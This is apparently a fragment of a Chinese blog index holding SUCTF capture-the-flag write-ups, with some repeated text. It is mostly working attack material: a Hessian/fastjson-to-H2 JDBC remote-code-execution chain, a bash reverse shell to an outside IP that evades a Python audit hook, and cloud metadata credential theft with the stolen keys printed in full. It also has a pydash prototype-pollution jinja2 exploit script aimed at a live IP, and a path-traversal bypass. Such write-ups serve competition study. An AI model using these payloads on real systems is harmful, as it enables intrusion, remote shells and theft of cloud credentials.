DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } æ„é€ æ–¹æ³•ä¼šè‡ªåŠ¨æ ¹æ®ä½ çš„driverClassNameæ¥æ³¨å†Œå¯¹åº”é©±åŠ¨ç±»ï¼Œç„¶ågetConnection()ä¹Ÿä¼šç›´æ¥ä»DriverManagerä¸­è¿›è¡ŒConnectionæ“ä½œï¼Œæ³›ç”¨æ€§å¾ˆå¼º\nç„¶ååé¢å¸¸è§„æ‰“h2RCEçš„æ€è·¯äº†ï¼Œæœ‰ä¸€ä¸ªSecurityManagerè¦ç»•ï¼Œå…¶å®ç›´æ¥è°ƒç”¨setSecurityManager(null)å°±å¥½äº†\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) ç¡®å®æ˜¯å¾ˆç®€å•çš„ä¸€ä¸ªäº‘æ¸—é€\nå‰é¢è¦ä»pythoné‚£é‡Œæ‹¿ä¸ªshellï¼Œä¸è¿‡æœ‰hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) è¿™é‡Œ_posixsubprocess.fork_execè¿™ä¸ªhookæ˜¯æŠ“ä¸äº†çš„ï¼Œæ‰€ä»¥å®ƒç­‰äºç™½å†™\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) ç›´æ¥æ‹¿shellï¼Œç„¶åç”¨ptyå‡çº§ä¸€ä¸‹è‡ªå·±çš„shell\nè¿›shellä¹‹åè¦ä¿¡æ¯æœé›†ä¸€ä¸‹ï¼Œè¿™é‡Œå¸¸ç”¨æ€è·¯å°±æ˜¯ç”¨cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... ä¸é¢˜ç›®åå­—ç›¸ç»“åˆï¼ŒçŸ¥é“äº†å…³é”®ä¿¡æ¯\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html ç„¶åå»çœ‹æ–‡æ¡£\nå¾ˆæ˜æ˜¾åœ¨é¢˜ç›®å†…æ˜¯æ²¡æœ‰å¼€åŠ å›ºæ¨¡å¼çš„,æˆ‘ä»¬è¿™é‡Œç›´æ¥è®¿é—®å°±å¥½\nç„¶åæ‹¿åˆ°äº†ä¸€ä¸ªak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } å¾ˆæ˜æ˜¾å°±æ˜¯è¦æˆ‘ä»¬å»ossğŸª£é‡Œçœ‹flagï¼Œä¸Šå»å‘ç°è¢«åˆ äº†ï¼Œä¸è¿‡æ²¡å¤šå¤§é—®é¢˜ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹ä¹‹å‰ç‰ˆæœ¬çš„å†…å®¹å°±å¥½äº†\nSU_blog æ³¨å†Œæ¥å£æœ‰ä¸ªä»»æ„ç”¨æˆ·å¯†ç é‡ç½®çš„æ´ï¼Œè¿™é‡Œç›´æ¥ç”¨adminåšç”¨æˆ·åå°±èƒ½é‡ç½®adminçš„å¯†ç äº†\nä¹Ÿçœäº†åé¢çˆ†ç ´jwtå¯†é’¥çš„æ“ä½œ\nçœ‹åˆ°articleé‡Œçš„ä¼ å‚ï¼Œå¾ˆæ˜æ˜¾çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œå°è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è·¯å¾„ç©¿è¶Š\nå‘ç°åŠ ../å’Œä¸åŠ æ˜¯ä¸€æ ·çš„ï¼ŒçŒœæµ‹åç«¯è¿›è¡Œäº†replaceæ“ä½œ\næ‰€ä»¥è¯•ä¸€ä¸‹åŒå†™..../ï¼Œç„¶åå°±èƒ½è¯»äº†\nè¯»åˆ°æºç å’Œwaf(wafæˆ‘è¿™é‡Œç”¨waf\u0026hellip;/pyæ¥ç»•è¿‡è¯»åˆ°)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;æœªæä¾›æ–‡ä»¶åã€‚\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;å¤§é»‘é˜”ä¸è®¸çœ‹\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æ•ˆçš„æ–‡ä»¶è·¯å¾„ã€‚\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æƒè®¿é—®è¯¥æ–‡ä»¶ã€‚\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ã€‚\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) é™¤äº†ä¹‹å‰ç”¨åˆ°çš„æ¥å£ï¼Œåªå‰©ä¸‹ä¸€ä¸ª/Admin\nè¿™é‡Œæœ‰ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œä¸è¿‡é¢˜ç›®è¦æˆ‘ä»¬RCEï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»“åˆä¸€ä¸‹jinja2çš„ä¸€ä¸ªæ¨¡ç‰ˆæ¸²æŸ“\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwafé‡Œæ•°å­—åªå‰©ä¸‹2ï¼Œä¹Ÿæ˜¯æŒ‡å¼•æˆ‘ä»¬æ‰“jinja2\næˆ‘ä»¬è¿˜éœ€è¦è·å–sysæ¨¡å—ï¼Œä¸Šé¢æ–‡ç« é“¾æ¥ä¸­çš„ä¸€ä¸ªpayloadæ˜¯ç”¨äº†__loader__ï¼Œä½†æ˜¯è¿™é¢˜è¢«banäº†\né‚£æˆ‘ä»¬åªèƒ½ç”¨__spec__æ¥ä»£æ›¿__loader__æ¥è·å–åˆ°sysæ¨¡å—\nå› ä¸ºæ¨¡ç‰ˆç¼–è¯‘åªåœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶æ‰ç¼–è¯‘ï¼Œæ‰€ä»¥è¦å¡å®¹å™¨é‡å¯çš„ç¬¬ä¸€æ—¶é—´æ‰èƒ½æ‰“é€š\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery ç”±404é¡µé¢å¯ä»¥å¾ˆæ˜æ˜¾çš„çŸ¥é“æ˜¯ä¸€ä¸ªä¸´æ—¶æœåŠ¡php -Så¼€å¯çš„\nå†æ ¹æ®å»å¹´å‡ºçš„ä¸€ä¸ªæ´ï¼Œç”±php -Så¼€å¯çš„æœåŠ¡åœ¨ç‰¹å®šç‰ˆæœ¬ä¸‹èƒ½å¤Ÿè¯»å–æºç \nhttps://cloud.tencent.com/developer/article/2235691\næ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯æœ‰æ¨¡å­¦æ ·çš„æ‹¿åˆ°æºç \nåç»­æ‰“çš„æ—¶å€™ç¢°åˆ°åˆ«äººå†™çš„shellï¼Œç„¶åç”¨æºç æ³„æ¼çœ‹å‚æ•°å°±ç›´æ¥æ‰“è¿›å»äº†(è¿™ä¹Ÿæ˜¯å…¬å…±ç¯å¢ƒåšé¢˜æ€è·¯çš„ä¸€éƒ¨åˆ†å­xsl)\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/post/test/","section":"post","tags":null,"title":"SUCTF"},{"categories":null,"contents":"SU_ez_solon é¢˜ç›®ç›´æ¥ç»™äº†ä¸ªhessianååºåˆ—åŒ–çš„æ¥å£\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } ä¸è¿‡ä»–è¿™ä¸ªååºåˆ—åŒ–è¿˜ç»™äº†ä¸€ä¸ªtoString()çš„è°ƒç”¨\nç„¶åå†è§‚å¯Ÿä¸€ä¸‹ç»™çš„ä¾èµ–\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2å’Œfastjsonè¿™ä¿©ä¾èµ–å†™ä¸€èµ·çš„ï¼Œå†åŠ ä¸Šä¸Šé¢çš„toString(),æŒ‡å‘å‹å¾ˆå¼ºäº†,å°±æ˜¯è®©æˆ‘ä»¬åˆ©ç”¨fastjsonçš„getteræ‰“ä¸€ä¸ªJDBCæ”»å‡»\nåšé¢˜è¿‡ç¨‹ åšé¢˜çš„æ—¶å€™æ‰¾äº†æœ‰å‡ ä¸ªèƒ½æ‰“é€šçš„ç±»ï¼Œä½†éƒ½å› ä¸ºsofa-hessianè‡ªå¸¦çš„ååºåˆ—åŒ–åå•è¢«åšæ‰äº†\næˆ‘ä»¬éœ€è¦çŸ¥é“åœ¨æ‰“h2çš„jdbcæ—¶ï¼Œæœ€åéƒ½ä¼šèµ°å‘å“ªä¸ªç±»çš„å“ªä¸ªæ–¹æ³•\norg.h2.jdbc.JdbcConnection.JdbcConnection()\nå°±æ˜¯JdbcConnectionçš„æ„é€ æ–¹æ³•ï¼Œä»¥æ­¤ä¸ºæ ¹æ®å»æ‰¾å“ªäº›getterä¼šå®ä¾‹åŒ–ä¸€ä¸ªJdbcConnectionç±»\nè¿™é‡Œå¯ä»¥å†™codeqlæ¥æ‰¾ï¼Œæˆ‘æœ‰ç‚¹æ‡’æ²¡å’‹å†™ï¼Œè¿™é‡Œå†™æˆ‘æ‰¾åˆ°çš„ä¸¤ä¸ªæ–¹æ³•\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource ç¬¬ä¸€ä¸ªè¢«é»‘åå•banäº†ï¼Œä½†æ˜¯å®ƒç»™äº†æˆ‘ä»¬äº›è®¸çµæ„Ÿï¼ŒJdbcDataSourceç±»å®ç°äº†DataSourceæ¥å£ï¼Œç»§æ‰¿è¿™ä¸ªæ¥å£çš„ç±»éƒ½è¦é‡å†™getConnection()æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»æ ¹æ®ç»§æ‰¿å…³ç³»æ¥å¯»æ‰¾é€‚åˆçš„æ–¹æ³•\næ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°äº†UnpooledDataSourceæ–¹æ³•ï¼Œå³ä¸åœ¨é»‘åå•ä¸Šï¼Œè€Œä¸”ä»–çš„æ„é€ æ–¹æ³•å’ŒgetConnectionä¹Ÿå¾ˆæœ‰æ„æ€\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } æ„é€ æ–¹æ³•ä¼šè‡ªåŠ¨æ ¹æ®ä½ çš„driverClassNameæ¥æ³¨å†Œå¯¹åº”é©±åŠ¨ç±»ï¼Œç„¶ågetConnection()ä¹Ÿä¼šç›´æ¥ä»DriverManagerä¸­è¿›è¡ŒConnectionæ“ä½œï¼Œæ³›ç”¨æ€§å¾ˆå¼º\nç„¶ååé¢å¸¸è§„æ‰“h2RCEçš„æ€è·¯äº†ï¼Œæœ‰ä¸€ä¸ªSecurityManagerè¦ç»•ï¼Œå…¶å®ç›´æ¥è°ƒç”¨setSecurityManager(null)å°±å¥½äº†\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new 